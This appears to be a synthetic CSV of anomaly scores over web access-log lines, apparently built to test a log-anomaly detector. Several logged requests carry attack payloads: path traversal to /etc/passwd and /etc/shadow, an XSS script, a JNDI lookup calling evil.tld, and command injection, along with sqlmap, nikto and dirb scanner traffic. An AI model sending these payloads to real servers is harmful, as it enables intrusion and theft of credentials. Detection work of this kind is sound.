score_content,score_session,score_fused,score_fused_norm,line
102.26799774169922,,102.26799774169922,102.26799774169922,{"remote_addr": "49.76.122.146", "time_local": "11/Jan/2025:09:07:01 -0700", "request": "TRACE /index.html HTTP/2", "status": 201, "body_bytes_sent": 15389, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
69.46117401123047,,69.46117401123047,69.46117401123047,{"remote_addr": "125.193.145.173", "time_local": "11/Jan/2025:09:07:02 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5250, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
13.101802825927734,,13.101802825927734,13.101802825927734,{"remote_addr": "57.138.30.150", "time_local": "11/Jan/2025:09:07:02 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 2520, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
13.2601957321167,,13.2601957321167,13.2601957321167,{"remote_addr": "22.181.186.144", "time_local": "11/Jan/2025:09:07:03 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 15322, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
50.04916000366211,,50.04916000366211,50.04916000366211,{"remote_addr": "118.200.122.209", "time_local": "11/Jan/2025:09:07:04 -0700", "request": "HEAD /logout HTTP/2", "status": 302, "body_bytes_sent": 5514, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
103.9712905883789,,103.9712905883789,103.9712905883789,{"remote_addr": "202.77.75.158", "time_local": "11/Jan/2025:09:07:05 -0700", "request": "TRACE /contact HTTP/2", "status": 204, "body_bytes_sent": 17348, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.9371603727340698,,1.9371603727340698,1.9371603727340698,{"remote_addr": "163.171.51.86", "time_local": "11/Jan/2025:09:07:06 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 1620, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
69.67045593261719,,69.67045593261719,69.67045593261719,{"remote_addr": "45.7.159.138", "time_local": "11/Jan/2025:09:07:07 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10296, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
0.28401800990104675,,0.28401800990104675,0.28401800990104675,{"remote_addr": "27.213.122.227", "time_local": "11/Jan/2025:09:07:07 -0700", "request": "GET /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 15981, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.991349935531616,,2.991349935531616,2.991349935531616,{"remote_addr": "134.47.124.233", "time_local": "11/Jan/2025:09:07:08 -0700", "request": "POST /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 11875, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
29.97686195373535,,29.97686195373535,29.97686195373535,{"remote_addr": "119.224.160.164", "time_local": "11/Jan/2025:09:07:08 -0700", "request": "POST /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 8012, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
69.51929473876953,,69.51929473876953,69.51929473876953,{"remote_addr": "93.216.118.94", "time_local": "11/Jan/2025:09:07:09 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16857, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.0027692317962646,,3.0027692317962646,3.0027692317962646,{"remote_addr": "2.227.203.5", "time_local": "11/Jan/2025:09:07:10 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 958, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
2.778634548187256,,2.778634548187256,2.778634548187256,{"remote_addr": "41.163.254.33", "time_local": "11/Jan/2025:09:07:11 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3025, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
4.795279026031494,,4.795279026031494,4.795279026031494,{"remote_addr": "166.141.36.224", "time_local": "11/Jan/2025:09:07:12 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 2586, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.2990548610687256,,2.2990548610687256,2.2990548610687256,{"remote_addr": "31.74.141.175", "time_local": "11/Jan/2025:09:07:13 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 5836, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
104.01248168945312,,104.01248168945312,104.01248168945312,{"remote_addr": "65.68.97.29", "time_local": "11/Jan/2025:09:07:13 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 4048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
69.48297882080078,,69.48297882080078,69.48297882080078,{"remote_addr": "89.223.55.53", "time_local": "11/Jan/2025:09:07:14 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12002, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
74.07459259033203,,74.07459259033203,74.07459259033203,{"remote_addr": "12.34.247.91", "time_local": "11/Jan/2025:09:07:15 -0700", "request": "OPTIONS /.env HTTP/2", "status": 302, "body_bytes_sent": 4347, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
106.96117401123047,,106.96117401123047,106.96117401123047,{"remote_addr": "145.156.190.86", "time_local": "11/Jan/2025:09:07:16 -0700", "request": "TRACE /about HTTP/2", "status": 304, "body_bytes_sent": 11238, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
0.21984745562076569,,0.21984745562076569,0.21984745562076569,{"remote_addr": "176.241.101.138", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11228, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
27.163103103637695,,27.163103103637695,27.163103103637695,{"remote_addr": "200.212.54.219", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 17671, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.582923412322998,,4.582923412322998,4.582923412322998,{"remote_addr": "108.209.111.234", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 17779, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30234.6875,,30234.6875,30234.6875,{"remote_addr": "166.142.39.45", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/2", "status": 403, "body_bytes_sent": 726, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
30139.76171875,,30139.76171875,30139.76171875,{"remote_addr": "65.80.143.99", "time_local": "11/Jan/2025:09:07:19 -0700", "request": "GET /assets/app.js HTTP/2", "status": 401, "body_bytes_sent": 1289, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
69.44934844970703,,69.44934844970703,69.44934844970703,{"remote_addr": "180.138.185.177", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "HEAD /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8041, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
14.309231758117676,,14.309231758117676,14.309231758117676,{"remote_addr": "7.133.158.230", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 304, "body_bytes_sent": 3998, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.19541369378566742,,0.19541369378566742,0.19541369378566742,{"remote_addr": "102.46.117.16", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3460, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
35.49428939819336,,35.49428939819336,35.49428939819336,{"remote_addr": "70.175.156.250", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9600, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
35.482975006103516,,35.482975006103516,35.482975006103516,{"remote_addr": "71.1.144.105", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 6179, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
24.402616500854492,,24.402616500854492,24.402616500854492,{"remote_addr": "99.114.218.4", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "GET /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10931, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
13.439459800720215,,13.439459800720215,13.439459800720215,{"remote_addr": "80.83.146.220", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "PUT / HTTP/2", "status": 200, "body_bytes_sent": 1727, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.9867607355117798,,1.9867607355117798,1.9867607355117798,{"remote_addr": "51.132.99.136", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 13252, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.333845138549805,,24.333845138549805,24.333845138549805,{"remote_addr": "17.189.64.84", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1201, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
126.4136734008789,,126.4136734008789,126.4136734008789,{"remote_addr": "75.111.165.188", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 17537, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
69.53221130371094,,69.53221130371094,69.53221130371094,{"remote_addr": "34.179.40.85", "time_local": "11/Jan/2025:09:07:27 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 4504, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
45.311180114746094,,45.311180114746094,45.311180114746094,{"remote_addr": "128.217.88.158", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 15399, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
70.82542419433594,,70.82542419433594,70.82542419433594,{"remote_addr": "120.31.17.46", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 3918, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
12.963008880615234,,12.963008880615234,12.963008880615234,{"remote_addr": "248.235.252.73", "time_local": "11/Jan/2025:09:07:29 -0700", "request": "PUT /server-status HTTP/2", "status": 204, "body_bytes_sent": 4289, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
38.42116928100586,,38.42116928100586,38.42116928100586,{"remote_addr": "184.126.242.141", "time_local": "11/Jan/2025:09:07:30 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 13380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
45.642208099365234,,45.642208099365234,45.642208099365234,{"remote_addr": "252.83.81.212", "time_local": "11/Jan/2025:09:07:31 -0700", "request": "HEAD /.env HTTP/2", "status": 200, "body_bytes_sent": 1407, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30163.830078125,,30163.830078125,30163.830078125,{"remote_addr": "137.91.70.243", "time_local": "11/Jan/2025:09:07:32 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 400, "body_bytes_sent": 875, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.9533249139785767,,1.9533249139785767,1.9533249139785767,{"remote_addr": "177.196.146.226", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9021, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
35.439884185791016,,35.439884185791016,35.439884185791016,{"remote_addr": "248.122.141.100", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16405, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30187.900390625,,30187.900390625,30187.900390625,{"remote_addr": "245.87.15.10", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "HEAD /contact HTTP/2", "status": 429, "body_bytes_sent": 1084, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
27.301616668701172,,27.301616668701172,27.301616668701172,{"remote_addr": "167.151.77.151", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 8737, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
35.47989273071289,,35.47989273071289,35.47989273071289,{"remote_addr": "178.176.94.241", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5236, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.699125289916992,,4.699125289916992,4.699125289916992,{"remote_addr": "45.31.230.102", "time_local": "11/Jan/2025:09:07:35 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 11041, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
95.08256530761719,,95.08256530761719,95.08256530761719,{"remote_addr": "74.180.3.226", "time_local": "11/Jan/2025:09:07:36 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 2069, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
69.49859619140625,,69.49859619140625,69.49859619140625,{"remote_addr": "74.185.69.149", "time_local": "11/Jan/2025:09:07:37 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 9695, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.34161376953125,,24.34161376953125,24.34161376953125,{"remote_addr": "146.83.205.163", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7741, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
24.328319549560547,,24.328319549560547,24.328319549560547,{"remote_addr": "36.184.230.94", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10134, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
4.7596659660339355,,4.7596659660339355,4.7596659660339355,{"remote_addr": "171.111.118.8", "time_local": "11/Jan/2025:09:07:39 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 3976, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
2.3282763957977295,,2.3282763957977295,2.3282763957977295,{"remote_addr": "245.216.25.69", "time_local": "11/Jan/2025:09:07:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 15266, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
129.16058349609375,,129.16058349609375,129.16058349609375,{"remote_addr": "27.25.73.143", "time_local": "11/Jan/2025:09:07:41 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 302, "body_bytes_sent": 7688, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.7917673587799072,,2.7917673587799072,2.7917673587799072,{"remote_addr": "78.168.142.57", "time_local": "11/Jan/2025:09:07:42 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 7486, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.0449416637420654,,2.0449416637420654,2.0449416637420654,{"remote_addr": "181.100.2.42", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 5397, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
49.6238899230957,,49.6238899230957,49.6238899230957,{"remote_addr": "87.54.37.6", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 14403, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
126.3464126586914,,126.3464126586914,126.3464126586914,{"remote_addr": "145.208.138.159", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 11272, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
45.3912239074707,,45.3912239074707,45.3912239074707,{"remote_addr": "69.216.125.37", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10423, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
11.43149471282959,,11.43149471282959,11.43149471282959,{"remote_addr": "100.47.244.18", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "PUT /.git/config HTTP/2", "status": 200, "body_bytes_sent": 909, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
45.45979309082031,,45.45979309082031,45.45979309082031,{"remote_addr": "66.15.96.130", "time_local": "11/Jan/2025:09:07:45 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 14192, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
27.323627471923828,,27.323627471923828,27.323627471923828,{"remote_addr": "106.192.108.53", "time_local": "11/Jan/2025:09:07:46 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 4349, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.900412082672119,,2.900412082672119,2.900412082672119,{"remote_addr": "235.218.74.32", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "POST /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13053, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
70.77173614501953,,70.77173614501953,70.77173614501953,{"remote_addr": "50.231.139.22", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16279, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
0.272757351398468,,0.272757351398468,0.272757351398468,{"remote_addr": "185.98.204.252", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2398, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30.168495178222656,,30.168495178222656,30.168495178222656,{"remote_addr": "59.136.204.201", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "DELETE /profile HTTP/2", "status": 301, "body_bytes_sent": 11929, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.2324774265289307,,3.2324774265289307,3.2324774265289307,{"remote_addr": "53.243.193.203", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "POST /.env HTTP/2", "status": 204, "body_bytes_sent": 5199, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.288148880004883,,27.288148880004883,27.288148880004883,{"remote_addr": "149.84.94.161", "time_local": "11/Jan/2025:09:07:50 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 4610, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
46.95021057128906,,46.95021057128906,46.95021057128906,{"remote_addr": "222.25.126.97", "time_local": "11/Jan/2025:09:07:51 -0700", "request": "HEAD /server-status HTTP/2", "status": 200, "body_bytes_sent": 5020, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
126.35930633544922,,126.35930633544922,126.35930633544922,{"remote_addr": "152.34.3.34", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "TRACE /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 8553, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
13.153829574584961,,13.153829574584961,13.153829574584961,{"remote_addr": "89.132.164.150", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
24.336944580078125,,24.336944580078125,24.336944580078125,{"remote_addr": "15.11.88.209", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 12975, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
103.7545166015625,,103.7545166015625,103.7545166015625,{"remote_addr": "46.252.94.36", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1968, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
30212.658203125,,30212.658203125,30212.658203125,{"remote_addr": "178.89.127.126", "time_local": "11/Jan/2025:09:07:54 -0700", "request": "OPTIONS / HTTP/2", "status": 404, "body_bytes_sent": 447, "http_referer": "-", "http_user_agent": "dirb/2.22"}
2.0431745052337646,,2.0431745052337646,2.0431745052337646,{"remote_addr": "141.32.128.93", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 16692, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
24.327716827392578,,24.327716827392578,24.327716827392578,{"remote_addr": "40.212.122.64", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 9944, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
126.3305892944336,,126.3305892944336,126.3305892944336,{"remote_addr": "50.77.37.99", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 6106, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
27.305665969848633,,27.305665969848633,27.305665969848633,{"remote_addr": "143.28.206.146", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 9998, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
47.204383850097656,,47.204383850097656,47.204383850097656,{"remote_addr": "17.66.216.180", "time_local": "11/Jan/2025:09:07:57 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 4295, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
4.733433246612549,,4.733433246612549,4.733433246612549,{"remote_addr": "125.120.2.160", "time_local": "11/Jan/2025:09:07:57 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 910, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
24.336034774780273,,24.336034774780273,24.336034774780273,{"remote_addr": "96.108.92.169", "time_local": "11/Jan/2025:09:07:58 -0700", "request": "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 14549, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
35.41903305053711,,35.41903305053711,35.41903305053711,{"remote_addr": "35.28.2.139", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 9282, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.5519147515296936,,0.5519147515296936,0.5519147515296936,{"remote_addr": "55.184.178.133", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "GET /.env HTTP/2", "status": 201, "body_bytes_sent": 16108, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.20513105392456055,,0.20513105392456055,0.20513105392456055,{"remote_addr": "163.89.138.10", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 6688, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
5.01141357421875,,5.01141357421875,5.01141357421875,{"remote_addr": "194.105.160.236", "time_local": "11/Jan/2025:09:08:00 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 3590, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
11155.5849609375,,11155.5849609375,11155.5849609375,{"remote_addr": "164.98.175.190", "time_local": "11/Jan/2025:09:08:01 -0700", "request": "TRACE /search?q=router HTTP/2", "status": 500, "body_bytes_sent": 599, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
47.20821762084961,,47.20821762084961,47.20821762084961,{"remote_addr": "159.143.101.180", "time_local": "11/Jan/2025:09:08:01 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 5557, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
5.915198802947998,,5.915198802947998,5.915198802947998,{"remote_addr": "75.120.173.11", "time_local": "11/Jan/2025:09:08:02 -0700", "request": "POST /.git/config HTTP/2", "status": 304, "body_bytes_sent": 5887, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
49.630313873291016,,49.630313873291016,49.630313873291016,{"remote_addr": "127.120.252.249", "time_local": "11/Jan/2025:09:08:02 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 9521, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
